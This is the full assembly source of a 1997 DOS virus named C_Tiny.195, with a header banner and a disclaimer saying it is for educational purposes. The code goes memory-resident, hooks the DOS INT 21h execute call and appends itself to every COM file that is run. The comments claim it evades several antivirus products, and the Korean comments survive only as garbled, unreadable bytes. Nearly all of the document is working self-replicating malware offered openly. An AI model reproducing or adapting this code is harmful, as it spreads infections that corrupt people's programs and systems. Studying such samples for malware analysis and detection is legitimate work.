;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;          C_Tiny.195                         \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
;
; Virus Name : C_Tiny.195
; Author     : Osiris
; Origin     : Corea
; Date       : 1997/12/08
;
; Type : Memory resident COM
;
; !****************************************************************************!
; *                                                                            *
; * �w�� !                                                                     *
; *    �����e �a����a ���a š�a���a. �a�B�ⷥ ����a���e �a�w�A�ᴡ�e�a.      *
; *    �A�b�a�e �� ���aš�a�� �����A�e ����e ���A�A ��Ё�ᕡ �����i ���� �g   *
; *    �e�a. �e�w �a��a ��З�a�� �a�a !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
; �e�e�e ���w�� �a����a�� ������a �B�� �����a�A �w���e�a. (0020:0000)
; �a����a �w���� �� �w�b�A �A����a ���a ���ᴡ �a�a. �e�� ���w�b�A 0 �� �a��
; �a�e �t�� ��w�A�� ���a�e �a����a�e ����w���A �w�� �a�� �g�e�a.
; �a����, COM �a���e �q�q��ǡ�a �q�q �a���e �a���� �� ������ 'M' ���� ���a �e�a
;
; AVP,DSAV,F-PROT,SCAN,TBAV �A�� �e�� ���e�A�� �g�e�a. �e, F-PROT �������w�A�e
; ���e�� �E�a. �a�q���A�e ���e�A�� �g�i �����a.
;
; ������a �B�� �A���i�A �w�� �a�e �a����a�e �a���a �a�� �b�a�� �e�a.
;
; ���b�ⷥ ���w�� �a����a �A�b�A �|�� �A�e�ⷥ ���w���w�� ������a�B�� ����
; �a�A �w�� �a�e �a����a���a.
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE
            .286

 C_Tiny:
            DB    0E8h,00,00            ;
            pop   si                    ; �a����a ���b�� ���a��
            sub   si,0003               ; SI = �a����a ���b��

            push  si                    ; ��w
            xor   di,DI                 ;
            mov   ds,DI
            mov   cx, offset End_Memory ; �a����a ���� �e�q ���a

 Check_IVT_Zero:
            cmp   byte ptr [DI+200h],0  ; ������a �����a�a 0 ���� ���a�e�a.
            jnz   Restore_COM_Head      ; �e�� ��� �t�� �a�� 0 �� �a�� �w���e
            inc   DI                    ; ����w���A �w�� �a�� �g�e�a
            loop  Check_IVT_Zero        ;

 Copy_Vir_IVT:
            mov   ax,0020h              ;
            mov   es,ax                 ;
            mov   cx, offset End_Virus  ; �a����a ����
            xor   di,di                 ; ���a �i �� (0020:0000h)
            db    2Eh
            repz  movsb                 ; ���a !

            mov   si, 0084h             ; Int 21h �����t �苡
            mov   di, offset Jmp_Org_Int21 + 1
            push  si
            movsw
            movsw

            pop   si                    ;
            cli                         ; Int 21h �a������
            mov   word ptr [SI], offset NewInt21
            mov   word ptr [SI+2], 0020h
            sti

 Restore_COM_Head:
            push  cs                    ; cs=ds=es
            pop   ds
            push  cs
            pop   es
            pop   si                    ; SI ����
            add   si, offset OldCOMHead ; COM �|���� ���� ���e
            mov   di,101h               ; COM �|���� ����
            dec   di                    ; DI = 100h
            push  di                    ; �����i ���� ��w
            movsw                       ; 4 �a���a ����
            movsw                       ;
            ret                         ; CS:100h �� ����

 OldCOMHead db    90h,90h,0CDh,20h      ; ���� COM �|����
            db    'C_Tiny.B'            ; �a����a ���q

 Set_Pnt:
            mov   ah,42h                ; ͡����
            xor   cx,cx
            xor   dx,dx
            int   21h
            ret

 call_Int21:
            xor   ah,0F0h               ;
            int   21h                   ;
            ret

 NewInt21:
            pusha                       ; 286 + �A�� ����
            push  ds
            push  es

            xchg  ah,al
            cmp   al, 4Bh               ; �a�� ��З���a ?
            jnz   Error

            mov   ax, (3D02h XOR 0F000h) ; �a�� �i��
            call  call_Int21
            jc    Error                 ; �i�� �A�� ?

            xchg  ax,bx                 ; BX = �a��Ѕ�i

            push  cs                    ; �A�a���a ɷ��
            pop   ds
            push  cs
            pop   es

            mov   ah, (3fh XOR 0F0h)    ; �a�� ����
            mov   cx, 4                 ; �a���a��
            mov   dx, offset OldCOMHead ; ���� ����
            call  call_Int21

            cmp   byte ptr OldCOMHead, 'M' ; �q�q�A���a / EXE �a�����a ?
            jz    Close

            mov   al,2                  ; �a�� �{�a�� ����
            call  Set_Pnt

            mov   word ptr Jump_Code, 0E94Dh ; ���i�a + ���a�t

            sub   ax,0004               ; ���a�t ���e
            mov   word ptr Jump_Code + 2, ax ;

            mov   ah, (40h XOR 0F0h)    ; �a����a �a��
            mov   cx, offset End_Virus  ; �a����a ����
            xor   dx,dx                 ; ���� ���a�U
            call  call_Int21

            xor   al,al                 ; �a�� ��q�a�� ����
            call  Set_Pnt

            mov   ah, (40h XOR 0F0h)    ; �|���� �a��
            mov   cx, 4                 ; �a���a ��
            mov   dx, offset Jump_Code  ; ���a�U
            call  call_Int21

 Close:
            mov   ah, (3Eh XOR 0F0h)    ; �a�� �h��
            call  call_Int21
 Error:
            pop   es
            pop   ds
            popa
 Jmp_Org_Int21:
            db    0EAh                  ; --> �a���a�� �a���A ��w
 End_Virus:
            dw    ?,?
 Jump_Code  dw    ?
            db    ?,?

 End_Memory:                            ; �A�����A�� �a����a �{
            END   C_Tiny

